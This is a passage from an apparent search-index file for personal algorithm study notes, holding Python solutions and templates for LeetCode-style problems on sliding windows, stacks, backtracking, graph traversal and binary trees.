# hashmap -&gt; 1 -&gt; 1\n        color_count = defaultdict(int) # color: count\n        # ball color can get replaced\n        # hashmap: list\n        color_index = {} # ball: color\n        res = []\n        for query in queries:\n            x, y = query\n            if x in color_index:\n                color = color_index[x]\n                color_count[color] -= 1\n                if color_count[color] == 0:\n                    del color_count[color]\n                color_index[x] = y\n                color_count[y] += 1\n            else:\n                color_index[x] = y\n                color_count[y] += 1\n            res.append(len(color_count))\n        return res\n</code></pre>"},{"location":"Algorithms/Simulation/#3159-find-occurrences-of-an-element-in-an-array","title":"3159. Find Occurrences of an Element in an Array","text":"<pre><code>class Solution:\n    def occurrencesOfElement(self, nums: List[int], queries: List[int], x: int) -&gt; List[int]:\n        # put the ans in the res index list -&gt; brute force, use a loop\n        # list[3]1 [index:]\n\n        index_ls = []\n        res = []\n        for i,num in enumerate(nums):\n            if num == x:\n                index_ls.append(i)\n\n        print(index_ls)\n        for query in queries:\n            if len(index_ls) &gt;= query:\n                res.append(index_ls[query-1])\n            else:\n                res.append(-1)\n        return res\n</code></pre>"},{"location":"Algorithms/Simulation/#532-k-diff-pairs-in-an-array","title":"532. K-diff Pairs in an Array","text":"<pre><code>class Solution:\n    def findPairs(self, nums: List[int], k: int) -&gt; int:\n        freq = Counter(nums)\n        res = 0\n\n        for num in freq:\n            if k !=0 and num + k in freq:\n                res += 1\n\n            if k == 0 and freq[num] &gt; 1:\n                res += 1\n\n        return res\n</code></pre>"},{"location":"Algorithms/Simulation/#1248-count-number-of-nice-subarrays","title":"1248. Count Number of Nice Subarrays","text":"<pre><code>class Solution:\n    def numberOfSubarrays(self, nums: List[int], k: int) -&gt; int:\n        left = 0\n        n = len(nums)\n        q_size = 0\n        count = 0\n        move = 0\n        for right, num in enumerate(nums):\n            if num % 2 != 0:\n                q_size += 1\n\n            if q_size == k:\n                #need to shrink the window but also count the moves\n                move = 0\n                while q_size == k:\n                    q_size -= nums[left] % 2 # if odd will give a result 1 and end the loop\n                    move += 1 # 1 subarray\n                    left += 1\n            count += move\n            print(num,count)\n\n        return count\n</code></pre>"},{"location":"Algorithms/Simulation/#923-3sum-with-multiplicity","title":"923. 3Sum With Multiplicity","text":"<pre><code>class Solution:\n    def threeSumMulti(self, arr: List[int], target: int) -&gt; int:\n        f_count = Counter()\n        n = len(arr)\n        res = 0\n        MOD = 10 ** 9 + 7\n        for second in range(n):\n            for third in range(second+1, n):\n                find = target - arr[second] - arr[third]\n                if find in f_count:\n                    res += f_count[find] \n            #update the first index at the end to ensure the order access\n            f_count[arr[second]] += 1\n\n        return res % MOD\n</code></pre>"},{"location":"Algorithms/Simulation/#954-array-of-doubled-pairs","title":"954. Array of Doubled Pairs","text":"<pre><code>class Solution:\n    def canReorderDoubled(self, arr: List[int]) -&gt; bool:\n        #convert to abs\n\n        freq =  Counter(arr)\n        print(sorted(freq, key=abs)) #output a list\n\n        for num in sorted(freq, key=abs):\n            if freq[num * 2] &lt; freq[num]:\n                return False\n\n            freq[num*2] -= freq[num]\n        return True\n</code></pre>"},{"location":"Algorithms/Simulation/#2131-longest-palindrome-by-concatenating-two-letter-words","title":"2131. Longest Palindrome by Concatenating Two Letter Words","text":"<pre><code>from collections import Counter\nfrom typing import List\n\nclass Solution:\n    def longestPalindrome(self, words: List[str]) -&gt; int:\n        word_count = Counter(words)\n        count = 0\n\n        for word in word_count.keys():\n            rev = word[::-1]\n\n            if word[0] == word[1]:\n                # symmetric case like \"gg\"\n                pairs = word_count[word] // 2\n                count += pairs * 4\n                word_count[word] -= pairs * 2\n            elif rev in word_count:\n                # asymmetric pair like \"ab\" and \"ba\"\n                pairs = min(word_count[word], word_count[rev])\n                count += pairs * 4\n                # del word_count[word]\n                # del word_count[rev]\n                word_count[word] = 0\n                word_count[rev] = 0\n\n        # After all pairing, try to use a center word like \"gg\"\n        for word in word_count:\n            if word[0] == word[1] and word_count[word] &gt; 0:\n                count += 2\n                break\n\n        return count\n</code></pre>"},{"location":"Algorithms/Sliding%20Window/","title":"Sliding Window","text":""},{"location":"Algorithms/Sliding%20Window/#best-time-to-buy-and-sell-stock","title":"Best Time to Buy and Sell Stock","text":"<pre><code>class Solution:\n    def maxProfit(self, prices: List[int]) -&gt; int:\n        max_profit = 0\n        min_price = prices[0]\n\n        for price in prices[1:]:\n            if price &lt; min_price:\n                min_price = price\n            else:\n                max_profit = max(max_profit, price - min_price)\n\n        return max_profit\n</code></pre>"},{"location":"Algorithms/Sliding%20Window/#longest-substring-without-repeating-characters","title":"Longest Substring Without Repeating Characters","text":"<pre><code>class Solution:\n    def lengthOfLongestSubstring(self, s: str) -&gt; int:\n        charSet = set()\n        l = 0\n        res = 0\n\n        for r in range(len(s)):\n            while s[r] in charSet:\n                charSet.remove(s[l])\n                l += 1\n            charSet.add(s[r])\n            res = max(res, r - l + 1)\n        return res\n</code></pre> <p>This is an optimize approach where we store the left pointer directly.</p> <pre><code>class Solution:\n    def lengthOfLongestSubstring(self, s: str) -&gt; int:\n        mp = {}\n        l = 0\n        res = 0\n\n        for r in range(len(s)):\n            if s[r] in mp:\n                l = max(mp[s[r]] + 1, l)\n            mp[s[r]] = r\n            res = max(res, r - l + 1)\n        return res\n</code></pre>"},{"location":"Algorithms/Sliding%20Window/#longest-repeating-character-replacement","title":"Longest Repeating Character Replacement","text":"<p>O(26 n)</p> <pre><code>class Solution:\n    def characterReplacement(self, s: str, k: int) -&gt; int:\n        count = defaultdict(int)\n        l = 0\n        max_len = 0\n\n        for r, char in enumerate(s):\n            # print(char)\n            count[char] += 1\n\n            while r - l + 1 - max(count.values()) &gt; k:\n                count[s[l]] -= 1\n                l += 1\n\n            max_len = max(max_len, r - l + 1)\n\n        return max_len\n</code></pre> <p>O(n)</p> <pre><code>class Solution:\n    def characterReplacement(self, s: str, k: int) -&gt; int:\n        count = defaultdict(int)\n        l = 0\n        max_len = 0\n        maxf = 0\n\n        for r, char in enumerate(s):\n            # print(char)\n            count[char] += 1\n            maxf = max(maxf, count[s[r]]) # the most frequenct chars\n\n            while r - l + 1 - maxf &gt; k: \n                count[s[l]] -= 1\n                l += 1\n\n            max_len = max(max_len, r - l + 1)\n\n        return max_len\n</code></pre>"},{"location":"Algorithms/Sliding%20Window/#minimum-window-substring","title":"Minimum Window Substring","text":"<pre><code>class Solution:\n    def minWindow(self, s: str, t: str) -&gt; str:\n        T = Counter(t)\n        window = defaultdict(int) # Window only track the valid keys\n\n        needed = len(T) # We compare the match dict keys\n        haved = 0\n\n        min_len = float('inf')\n        l = 0\n        res = [-1, -1] # Store the index of the returned\n\n        for r,char in enumerate(s):\n            if char in T: # If a match\n                window[char] += 1\n                if window[char] == T[char]: # If value matches\n                    haved += 1\n\n                while haved == needed: \n                    # Update result\n                    if (r - l + 1) &lt; min_len:\n                        min_len = r - l + 1\n                        res = [l, r]\n\n                    # Try to shrink window\n                    left_char = s[l]\n                    if left_char in T:\n                        if window[left_char] == T[left_char]:\n                            haved -= 1\n                        window[left_char] -= 1\n                    l += 1\n        l, r = res\n        if l != -1:            \n            return s[l:r + 1]\n        else:\n            return \"\"\n</code></pre>"},{"location":"Algorithms/Stack/","title":"Stack","text":""},{"location":"Algorithms/Stack/#stack-deque","title":"Stack, Deque","text":""},{"location":"Algorithms/Stack/#stack-lifo-last-in-first-out","title":"\ud83d\udce6 Stack (LIFO \u2013 Last In, First Out)","text":"<p>In python, stack can be simply represented using the list.</p> <pre><code>stack = []\n\n# Push\nstack.append(10)\nstack.append(20)\n\n# Pop\ntop = stack.pop()  # 20\n\n# Peek\npeek = stack[-1]    # 10\n\n# Check if empty\nis_empty = len(stack) == 0\n</code></pre>"},{"location":"Algorithms/Stack/#deque-double-ended-queue","title":"\ud83d\udd01 Deque (Double-Ended Queue)","text":"<p>For more efficient stack/queue operations, use <code>collections.deque</code>:, we can also use it to represent queue (FIFO) directly</p> <pre><code>from collections import deque\n\ndq = deque()\n\n# Stack operations\ndq.append(1)     # push to end\nval = dq.pop()   # pop from end\n\n# Queue operations\ndq.appendleft(2)   # enqueue to front\nval = dq.popleft() # dequeue from front\n</code></pre> <p>Both data structures are O(1).</p>"},{"location":"Algorithms/Stack/#valid-parentheses","title":"Valid Parentheses","text":"<pre><code>class Solution:\n    def isValid(self, s: str) -&gt; bool:\n        # Use Stack\n        stack = []\n\n        for char in s:\n            # If closing bracket\n            if stack and char in (')','}',']'):\n                top = stack.pop()\n                if top == '(' and char == ')':\n                    continue\n                elif top == '{' and char == '}':\n                    continue\n                elif top == '[' and char == ']':\n                    continue\n                else:\n                    # Not a valid match\n                    return False\n            stack.append(char)\n        if stack:\n            return False\n        return True\n</code></pre>"},{"location":"Algorithms/Stack/#minimum-stack","title":"Minimum Stack","text":"<pre><code>class MinStack:\n\n    def __init__(self):\n        self.stack = []\n        # Keep a record of each value with the min\n\n    def push(self, val: int) -&gt; None:\n        if self.stack:\n            min_value = self.getMin()\n            if min_value &lt; val:\n                self.stack.append((val, min_value))\n            else:\n                self.stack.append((val, val))\n        else:\n            self.stack.append((val, val))\n\n    def pop(self) -&gt; None:\n        self.stack.pop()\n\n    def top(self) -&gt; int:\n        return self.stack[-1][0]\n\n    def getMin(self) -&gt; int:\n        print(self.stack)\n        return self.stack[-1][1]\n</code></pre>"},{"location":"Algorithms/Stack/#evaluate-reverse-polish-notation","title":"Evaluate Reverse Polish Notation","text":"<pre><code>class Solution:\n    def evalRPN(self, tokens: List[str]) -&gt; int:\n        stack = []\n\n        for token in tokens:\n            # assume the stack would always be true when encounter a symbol\n            if token in ('+', '-', '*', '/'):\n                right = stack.pop()\n                left = stack.pop()\n                if token == '+':\n                    stack.append(int(left) + int(right))\n                elif token == '-':\n                    stack.append(int(left) - int(right))\n                elif token == '*':\n                    stack.append(int(left) * int(right))\n                elif token == '/':\n                    stack.append(int(left) / int(right))\n            else:\n                stack.append(token)\n\n        return int(stack[-1])\n</code></pre>"},{"location":"Algorithms/Stack/#generate-parentheses","title":"Generate Parentheses","text":"<pre><code>class Solution:\n    def generateParenthesis(self, n: int) -&gt; List[str]:\n        # Backtracking with stack\n        stack = []\n        res = []\n\n        def backtrack(openN, closeN):\n            if openN == closeN == n:\n                res.append(''.join(stack))\n                return\n\n            # openN should alwasy be greater than closeN\n            if openN &lt; n:    # 2 conditions\n                stack.append('(')\n                backtrack(openN + 1, closeN)\n                stack.pop()\n\n            if closeN &lt; openN:\n                stack.append(')')\n                backtrack(openN, closeN + 1)\n                stack.pop()\n\n        backtrack(0, 0)\n        return res\n</code></pre>"},{"location":"Algorithms/Stack/#daily-temperatures-monotonic-stack","title":"Daily Temperatures - Monotonic Stack","text":"<p>A monotonic stack or queue is a data structure that maintains its elements in a strictly increasing or decreasing order, allowing efficient access to the next greater or smaller element during traversal or processing. A good link</p> <pre><code>class Solution:\n    def dailyTemperatures(self, temperatures: List[int]) -&gt; List[int]:\n        # Mono stack with the index stored\n\n        stack = []\n        res = [0] * len(temperatures)\n\n        for r, temp in enumerate(temperatures):\n            while stack and temp &gt; stack[-1][0]:\n                val, l = stack.pop()\n                res[l] = r - l\n\n            stack.append((temp, r))\n        return res\n</code></pre>"},{"location":"Algorithms/Stack/#car-fleet","title":"Car Fleet","text":"<pre><code>class Solution:\n    def carFleet(self, target: int, position: List[int], speed: List[int]) -&gt; int:\n        # position = [4,1,0,7], speed = [2,2,1,1]\n        pos_speed = []\n        for i in range(len(position)):\n            pos_speed.append((position[i], speed[i]))\n\n        pos_speed.sort(reverse = True)\n\n        stack = [] # maintain the number of overlapped fleets\n        for i in range(len(pos_speed)):\n            time_take = (target - pos_speed[i][0]) / pos_speed[i][1] # Float\n            if stack and time_take &gt; stack[-1]: # copmare every element, cuz the stack is in increasing order, so we don't need to worry about the order, always compare with the current largest, if over means a new fleet found\n                stack.append(time_take)\n            if i == 0:\n                stack.append(time_take)\n                continue\n        return len(stack)\n</code></pre>"},{"location":"Algorithms/Stack/#largest-rectangle-in-histogram","title":"Largest Rectangle In Histogram","text":"<p>Core idea is that we need to identify use stack for this problem to aim O(n) time. </p> <p>This algorithm uses a monotonic increasing stack to find the largest rectangle in a histogram by storing <code>(height, index)</code> pairs.</p> <ul> <li>As you iterate, if the current height is smaller than the height at the top of the stack, you pop from the stack, treating it as the height of a potential rectangle that ends at the current index.</li> <li>For each popped bar, you calculate the area using its height and the width from its stored index to the current index.</li> <li>After finishing the iteration, you process any remaining bars in the stack as if they extend to the end of the histogram.</li> </ul> <p></p> <p></p> <pre><code>class Solution:\n    def largestRectangleArea(self, heights: List[int]) -&gt; int:\n        max_area = 0\n        stack = [] # Keep track of the areas\n\n        for r, height in enumerate(heights):\n            # If the curr height is smaller than previous, pop the stack\n            curr = r\n            while stack and height &lt; stack[-1][0]: # pop the bar where height is greater than current bar\n                l_height, l = stack.pop() \n                max_area = max(max_area, (curr - l) * l_height) # compute the max area\n                r = l\n            stack.append((height, r)) \n        # And also process the end of stack\n        r = len(heights)\n        while stack:\n            l_height, l = stack.pop()\n            max_area = max(max_area, (r - l) * l_height)\n        return max_area\n</code></pre>"},{"location":"Algorithms/Stack/#largest-square-in-histogram","title":"Largest Square In Histogram","text":"<p>Got this question in the code signal Q4, the question is basically asking finding the largest square similar to the previous one. And the only difference would be we need to add a constraint this time which we can only choose the minimum(width, height) to calculate the square.</p> <pre><code>class Solution:\n    def largestRectangleArea(self, heights: List[int]) -&gt; int:\n        max_area = 0\n        stack = []  # (height, index)\n\n        for r, height in enumerate(heights):\n            curr = r\n            while stack and height &lt; stack[-1][0]:\n                l_height, l = stack.pop()\n                width = curr - l\n                side = min(l_height, width)  # side of the square\n                max_area = max(max_area, side * side)\n                r = l  # reuse previous left boundary\n            stack.append((height, r))\n\n        r = len(heights)\n        while stack:\n            l_height, l = stack.pop()\n            width = r - l\n            side = min(l_height, width)\n            max_area = max(max_area, side * side)\n\n        return max_area\n</code></pre>"},{"location":"Algorithms/Stack/#summary","title":"Summary","text":""},{"location":"Algorithms/Stack/#stack-deque-and-monotonic-stackqueue-summary","title":"\ud83e\uddfe Stack, Deque, and Monotonic Stack/Queue Summary","text":"Structure Purpose Python Implementation Common Ops (Time) Notes Stack LIFO (Last In First Out) <code>list</code> or <code>collections.deque</code> <code>append()</code>, <code>pop()</code> \u2013 O(1) Use <code>list</code> for simple stacks; prefer <code>deque</code> for large/modifying stacks Deque Double-ended queue <code>collections.deque</code> <code>append()</code>, <code>appendleft()</code>, <code>pop()</code>, <code>popleft()</code> \u2013 O(1) Efficient at both ends; good for queues, sliding windows Monotonic Stack Maintain increasing/decreasing order <code>list</code> Custom push/pop logic Used in next greater/smaller element problems Monotonic Queue Maintain increasing/decreasing order <code>deque</code> Custom append/pop logic Often used in sliding window maximum/minimum problems"},{"location":"Algorithms/Templates/","title":"Templates","text":""},{"location":"Algorithms/Templates/#backtracking-aggregation","title":"Backtracking - Aggregation","text":"<pre><code>def dfs(start_index, [...additional states]):\n    if is_leaf(start_index):\n        return 1\n    ans = initial_value\n    for edge in get_edges(start_index, [...additional states]):\n        if additional states: \n            update([...additional states])\n        ans = aggregate(ans, dfs(start_index + len(edge), [...additional states]))\n        if additional states: \n            revert([...additional states])\n    return ans\n</code></pre>"},{"location":"Algorithms/Templates/#backtracking-basic","title":"Backtracking - Basic","text":"<pre><code>ans = []\ndef dfs(start_index, path, [...additional states]):\n    if is_leaf(start_index):\n        ans.append(path[:]) # add a copy of the path to the result\n        return\n    for edge in get_edges(start_index, [...additional states]):\n        # prune if needed\n        if not is_valid(edge):\n            continue\n        path.add(edge)\n        if additional states:\n            update(...additional states)\n        dfs(start_index + len(edge), path, [...additional states])\n        # revert(...additional states) if necessary e.g. permutations\n        path.pop()\n</code></pre>"},{"location":"Algorithms/Templates/#binary-search","title":"Binary Search","text":"<pre><code>def binary_search(arr: List[int], target: int) -&gt; int:\n    left, right = 0, len(arr) - 1\n    first_true_index = -1\n    while left &lt;= right:\n        mid = (left + right) // 2\n        if feasible(mid):\n            first_true_index = mid\n            right = mid - 1\n        else:\n            left = mid + 1\n\n    return first_true_index\n</code></pre>"},{"location":"Algorithms/Templates/#bfs-on-tree","title":"BFS on Tree","text":"<pre><code>def bfs(root):\n    queue = deque([root])\n    while len(queue) &gt; 0:\n        node = queue.popleft()\n        for child in node.children:\n            if is_goal(child):\n                return FOUND(child)\n            queue.append(child)\n    return NOT_FOUND\n</code></pre>"},{"location":"Algorithms/Templates/#dfs-on-tree","title":"DFS on Tree","text":"<pre><code>def dfs(root, target):\n    if root is None:\n        return None\n    if root.val == target:\n        return root\n    left = dfs(root.left, target)\n    if left is not None:\n        return left\n    return dfs(root.right, target)\n</code></pre>"},{"location":"Algorithms/Templates/#bfs-on-graphs","title":"BFS on Graphs","text":"<pre><code>def bfs(root):\n    queue = deque([root])\n    visited = set([root])\n    while len(queue) &gt; 0:\n        node = queue.popleft()\n        for neighbor in get_neighbors(node):\n            if neighbor in visited:\n                continue\n            queue.append(neighbor)\n            visited.add(neighbor)\n</code></pre>"},{"location":"Algorithms/Templates/#dfs-on-graphs","title":"DFS on Graphs","text":"<pre><code>def dfs(root, visited):\n    for neighbor in get_neighbors(root):\n        if neighbor in visited:\n            continue\n        visited.add(neighbor)\n        dfs(neighbor, visited)\n</code></pre>"},{"location":"Algorithms/Templates/#bfs-on-a-matrix","title":"BFS on a Matrix","text":"<pre><code>num_rows, num_cols = len(grid), len(grid[0])\ndef get_neighbors(coord):\n    row, col = coord\n    delta_row = [-1, 0, 1, 0]\n    delta_col = [0, 1, 0, -1]\n    res = []\n    for i in range(len(delta_row)):\n        neighbor_row = row + delta_row[i]\n        neighbor_col = col + delta_col[i]\n        if 0 &lt;= neighbor_row &lt; num_rows and 0 &lt;= neighbor_col &lt; num_cols:\n            res.append((neighbor_row, neighbor_col))\n    return res\n\nfrom collections import deque\n\ndef bfs(starting_node):\n    queue = deque([starting_node])\n    visited = set([starting_node])\n    while len(queue) &gt; 0:\n        node = queue.popleft()\n        for neighbor in get_neighbors(node):\n            if neighbor in visited:\n                continue\n            # Do stuff with the node if required\n            # ...\n            queue.append(neighbor)\n            visited.add(neighbor)\n</code></pre>"},{"location":"Algorithms/Templates/#mono-stack","title":"Mono Stack","text":"<pre><code>def mono_stack(insert_entries):\n    stack = []\n    for entry in insert_entries:\n        while stack and stack[-1] &lt;= entry:\n            stack.pop()\n            # Do something with the popped item here\n        stack.append(entry)\n</code></pre>"},{"location":"Algorithms/Templates/#prefix-sum","title":"Prefix Sum","text":"<pre><code>def build_prefix_sum(arr):\n    n = len(arr)\n    prefix_sum = [0] * n\n    prefix_sum[0] = arr[0]\n    for i in range(1, n):\n        prefix_sum[i] = prefix_sum[i-1] + arr[i]\n    return prefix_sum\n\n# Query sum of range [left, right] (inclusive)\ndef query_range(prefix_sum, left, right):\n    if left == 0:\n        return prefix_sum[right]\n    return prefix_sum[right] - prefix_sum[left-1]\n</code></pre>"},{"location":"Algorithms/Templates/#sliding-window-fixed-size","title":"Sliding Window (Fixed Size)","text":"<pre><code>def sliding_window_fixed(input, window_size):\n    ans = window = input[0:window_size]\n    for right in range(window_size, len(input)):\n        left = right - window_size\n        remove input[left] from window\n        append input[right] to window\n        ans = optimal(ans, window)\n    return ans\n</code></pre>"},{"location":"Algorithms/Templates/#sliding-window-flexible-longest","title":"Sliding Window Flexible - Longest","text":"<pre><code>def sliding_window_flexible_longest(input):\n    initialize window, ans\n    left = 0\n    for right in range(len(input)):\n        append input[right] to window\n        while invalid(window):        # update left until window is valid again\n            remove input[left] from window\n            left += 1\n        ans = max(ans, window)        # window is guaranteed to be valid here\n    return ans\n</code></pre>"},{"location":"Algorithms/Templates/#sliding-window-flexible-shortest","title":"Sliding Window Flexible - Shortest","text":"<pre><code>def sliding_window_flexible_shortest(input):\n    initialize window, ans\n    left = 0\n    for right in range(len(input)):\n        append input[right] to window\n        while valid(window):\n            ans = min(ans, window)      # window is guaranteed to be valid here\n            remove input[left] from window\n            left += 1\n    return ans\n</code></pre>"},{"location":"Algorithms/Templates/#topological-sort","title":"Topological Sort","text":"<pre><code>def find_indegree(graph):\n    indegree = { node: 0 for node in graph }  # dict\n    for node in graph:\n        for neighbor in graph[node]:\n            indgree[neighbor] += 1\n    return indegree\n\n\ndef topo_sort(graph):\n    res = []\n    q = deque()\n    indegree = find_indegree(graph)\n    for node in indegree:\n        if indegree[node] == 0:\n            q.append(node)\n    while len(q) &gt; 0:\n        node = q.popleft()\n        res.append(node)\n        for neighbor in graph[node]:\n            indegree[neighbor] -= 1\n            if indegree[neighbor] == 0:\n                q.append(neighbor)\n    return res if len(graph) == len(res) else None\n</code></pre>"},{"location":"Algorithms/Templates/#trie","title":"Trie","text":"<pre><code>class Node:\n    def __init__(self, value):\n        self.value = value\n        self.children = {}\n\n    def insert(self, s, idx):\n        # idx: index of the current character in s\n        if idx != len(s):\n            self.children.setdefault(s[idx], Node(s[idx]))\n            self.children.get(s[idx]).insert(s, idx + 1)\n</code></pre>"},{"location":"Algorithms/Templates/#two-pointers-opposite-direction","title":"Two Pointers (Opposite Direction)","text":"<pre><code>def two_pointers_opposite(arr):\n    left, right = 0, len(arr) - 1\n    while left &lt; right:\n        # Process current elements\n        current = process(arr[left], arr[right])\n\n        # Update pointers based on condition\n        if condition(arr[left], arr[right]):\n            left += 1\n        else:\n            right -= 1\n</code></pre>"},{"location":"Algorithms/Templates/#two-pointers-same-direction","title":"Two Pointers (Same Direction)","text":"<pre><code>def two_pointers_same(arr):\n    slow, fast = 0, 0\n    while fast &lt; len(arr):\n        # Process current elements\n        current = process(arr[slow], arr[fast])\n\n        # Update pointers based on condition\n        if condition(arr[slow], arr[fast]):\n            slow += 1\n\n        # Fast pointer always moves forward\n        fast += 1\n</code></pre>"},{"location":"Algorithms/Templates/#union-find","title":"Union Find","text":"<pre><code>class UnionFind:\n    def __init__(self):\n        self.id = {}\n\n    def find(self, x):\n        y = self.id.get(x, x)\n        if y != x:\n            self.id[x] = y = self.find(y)\n        return y\n\n    def union(self, x, y):\n        self.id[self.find(x)] = self.find(y)\n</code></pre>"},{"location":"Algorithms/Trees/","title":"Trees","text":""},{"location":"Algorithms/Trees/#trees","title":"Trees","text":"<p>https://www.w3schools.com/dsa/dsa_theory_trees.php</p> <p></p> <pre><code>def pre_order(root: TreeNode | None):\n    \"\"\"\u524d\u5e8f\u904d\u5386\"\"\"\n    if root is None:\n        return\n    # \u8bbf\u95ee\u4f18\u5148\u7ea7\uff1a\u6839\u8282\u70b9 -&gt; \u5de6\u5b50\u6811 -&gt; \u53f3\u5b50\u6811\n    res.append(root.val)\n    pre_order(root=root.left)\n    pre_order(root=root.right)\n\ndef in_order(root: TreeNode | None):\n    \"\"\"\u4e2d\u5e8f\u904d\u5386\"\"\"\n    if root is None:\n        return\n    # \u8bbf\u95ee\u4f18\u5148\u7ea7\uff1a\u5de6\u5b50\u6811 -&gt; \u6839\u8282\u70b9 -&gt; \u53f3\u5b50\u6811\n    in_order(root=root.left)\n    res.append(root.val)\n    in_order(root=root.right)\n\ndef post_order(root: TreeNode | None):\n    \"\"\"\u540e\u5e8f\u904d\u5386\"\"\"\n    if root is None:\n        return\n    # \u8bbf\u95ee\u4f18\u5148\u7ea7\uff1a\u5de6\u5b50\u6811 -&gt; \u53f3\u5b50\u6811 -&gt; \u6839\u8282\u70b9\n    post_order(root=root.left)\n    post_order(root=root.right)\n    res.append(root.val)\n</code></pre>"},{"location":"Algorithms/Trees/#invert-binary-tree","title":"Invert Binary Tree","text":"<p>We can identify that each node in the tree is switched, so we can simply just switch the left and right node</p> <pre><code>class Solution:\n    def invertTree(self, root: Optional[TreeNode]) -&gt; Optional[TreeNode]:\n        #dfs on each node and switch each other\n        def dfs(root):\n            if not root:\n                return\n\n            root.left, root.right = root.right, root.left\n            dfs(root.left)\n            dfs(root.right)\n\n        dfs(root)\n        return root\n</code></pre>"},{"location":"Algorithms/Trees/#maximum-depth-of-binary-tree","title":"Maximum Depth of Binary Tree","text":"<p>DFS use the level to track each node and return when it reaches the bottom, and compare the max(left, right). Bottom up</p> <pre><code>class Solution:\n    def maxDepth(self, root: Optional[TreeNode]) -&gt; int:\n        if not root:\n            return 0\n\n        return 1 + max(self.maxDepth(root.left), self.maxDepth(root.right))\n\n# Below is an uncommon top-down style approach where we increment the level for each step\ndef dfs(node, level):\n    if not node:\n        return level\n    left = dfs(node.left, level + 1)\n    right = dfs(node.right, level + 1)\n    return max(left, right)\n</code></pre> <p>BFS approach</p> <pre><code>class Solution:\n    def maxDepth(self, root: Optional[TreeNode]) -&gt; int:\n        # bfs store each node and pop\n        if not root:\n            return 0\n        def bfs(root):\n            depth = 0\n            q = deque([root])\n            while q:\n                n = len(q)\n                depth += 1\n                for _ in range(n):\n                    node = q.popleft()\n                    if node.left:\n                        q.append(node.left)\n                    if node.right:\n                        q.append(node.right)\n            return depth\n        return bfs(root)\n</code></pre>"},{"location":"Algorithms/Trees/#diameter-of-binary-tree","title":"Diameter of Binary Tree","text":"<p>Similar to find the depth of binary tree, we just need to also track if the left + right is the maximum, we could add a comparison function before returning each node's depth.</p> <pre><code>class Solution:\n    def diameterOfBinaryTree(self, root: Optional[TreeNode]) -&gt; int:\n        # for each node, we check the left and right, and also left + right\n        self.res = 0\n        def dfs(root):\n            if not root:\n                return 0\n            left = dfs(root.left)\n            right = dfs(root.right)\n            self.res = max(self.res, left + right) # track the diameter\n\n            return 1 + max(left, right)\n\n        dfs(root)\n        return self.res\n</code></pre>"},{"location":"Algorithms/Trees/#balanced-binary-tree","title":"Balanced Binary Tree","text":"<p>Similar idea of finding the depth of the binary tree, this case we would compare each node's height. Notice there are serval ways to determine the result, I am using a self.balanced for simplicity, but we could also use a tuple to store the state or change the return on left and right (-1) when it is unbalanced in this question.</p> <pre><code>class Solution:\n    def isBalanced(self, root: Optional[TreeNode]) -&gt; bool:\n        self.balanced = True\n        def dfs(root):\n            if not root:\n                return 0\n\n            left = dfs(root.left)\n            right = dfs(root.right)\n\n            if abs(left - right) &gt; 1:\n                self.balanced = False\n\n            return 1 + max(left, right)\n\n        dfs(root)\n        return self.balanced\n</code></pre>"},{"location":"Algorithms/Trees/#same-binary-tree","title":"Same Binary Tree","text":"<p>Traverse both trees at the same time and compare each node's value.</p> <pre><code>class Solution:\n    def isSameTree(self, p: Optional[TreeNode], q: Optional[TreeNode]) -&gt; bool:\n        def dfs(p, q):\n            if not p and not q:\n                return True\n            elif not p:\n                return False\n            elif not q:\n                return False\n\n            if p.val != q.val:\n                return False\n\n            left = dfs(p.left, q.left)\n            right = dfs(p.right, q.right)\n\n            return left and right\n\n        return dfs(p, q)\n</code></pre>"},{"location":"Algorithms/Trees/#subtree-of-another-tree","title":"Subtree of Another Tree","text":"<p>We could separate this question into 2 parts, one is find if 2 trees are identical and second is to iterate each node on the root and compare to check if there is a match.</p> <pre><code>class Solution:\n    def isSubtree(self, root: Optional[TreeNode], subRoot: Optional[TreeNode]) -&gt; bool:\n        def isSameTree(p, q):\n            if not p and not q:\n                return True\n            elif not p:\n                return False\n            elif not q:\n                return False\n\n            if p.val != q.val:\n                return False\n\n            left = isSameTree(p.left, q.left)\n            right = isSameTree(p.right, q.right)\n\n            return left and right\n\n        def dfs(root):\n            if not root:\n                return False\n            if isSameTree(root, subRoot):\n                return True\n            left = dfs(root.left)\n            right = dfs(root.right)\n\n            return left or right\n\n        return dfs(root)\n</code></pre>"},{"location":"Algorithms/Trees/#lowest-common-ancestor-in-binary-search-tree-dfs","title":"* Lowest Common Ancestor in Binary Search Tree - DFS","text":"<p>The DFS approach is straightforward and would take O(n) space, but we can further optimize into O(1) space.</p> <pre><code>class Solution:\n    def lowestCommonAncestor(self, root: TreeNode, p: TreeNode, q: TreeNode) -&gt; TreeNode:\n        # mid, left, right\n        self.ans = None\n        def dfs(root):\n            if not root:\n                return False\n\n            left = dfs(root.left)\n            right = dfs(root.right)\n\n            mid = True if root.val == p.val or root.val == q.val else False\n            if left + right + mid &gt;= 2:\n                self.ans = root\n\n            return left or right or mid\n\n        dfs(root)\n        return self.ans\n</code></pre> <p>We can use the property of the binary search tree, when that basically if a node is between the p and q, then it should become the LCA and we can return. If both nodes smaller, we can set the curr to left node and vice versa for the right node.</p> <pre><code>class Solution:\n    def lowestCommonAncestor(self, root: TreeNode, p: TreeNode, q: TreeNode) -&gt; TreeNode:\n        cur = root\n\n        while cur:\n            if p.val &gt; cur.val and q.val &gt; cur.val:\n                cur = cur.right\n            elif p.val &lt; cur.val and q.val &lt; cur.val:\n                cur = cur.left\n            else:\n                return cur\n</code></pre>"},{"location":"Algorithms/Trees/#binary-tree-level-order-traversal-bfs","title":"Binary Tree Level Order Traversal - BFS","text":"<pre><code>class Solution:\n    def levelOrder(self, root: Optional[TreeNode]) -&gt; List[List[int]]:\n        # bfs on each q length, append the left right node\n        if not root:\n            return []\n        q = deque([root])\n        res = []\n        while q:\n            level = []\n            for _ in range(len(q)):\n                node = q.popleft()\n                level.append(node.val)\n                if node.left:\n                    q.append(node.left)\n                if node.right:\n                    q.append(node.right)\n            res.append(level)\n        return res\n</code></pre>"},{"location":"Algorithms/Trees/#binary-tree-right-side-view-bfs","title":"Binary Tree Right Side View - BFS","text":"<pre><code>class Solution:\n    def rightSideView(self, root: Optional[TreeNode]) -&gt; List[int]:\n        # bfs and store the first appeared result\n        res = []\n        q = deque([root])\n        if not root:\n            return []\n        while q:\n            for i in range(len(q)):\n                node = q.popleft()\n                if i == 0:\n                    res.append(node.val)\n                if node.right:\n                    q.append(node.right)\n                if node.left:\n                    q.append(node.left)\n        return res\n</code></pre>"},{"location":"Algorithms/Trees/#count-good-nodes-in-binary-tree","title":"Count Good Nodes in Binary Tree","text":"<pre><code>class Solution:\n    def goodNodes(self, root: TreeNode) -&gt; int:\n        # top 